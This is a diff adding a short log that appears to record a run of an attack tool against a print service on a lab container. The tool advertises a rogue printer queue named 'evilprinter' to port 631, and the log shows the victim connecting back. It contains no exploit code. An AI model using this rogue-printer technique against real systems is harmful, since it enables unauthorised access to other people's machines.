@@ -1,0 +1,7 @@
+15:05:03 [INFO] Target: 172.18.0.2
+15:05:03 [INFO] Advertising: 172.18.0.1:9999  queue=evilprinter
+.15:05:03 [INFO] Sent announcement to 172.18.0.2:631
+15:05:03 [WARNING] >>> VICTIM CONNECTED BACK from 172.18.0.2:60890
+15:05:03 [INFO] POST /printers/evilprinter HTTP/1.1
+
+Sent 1 packets.
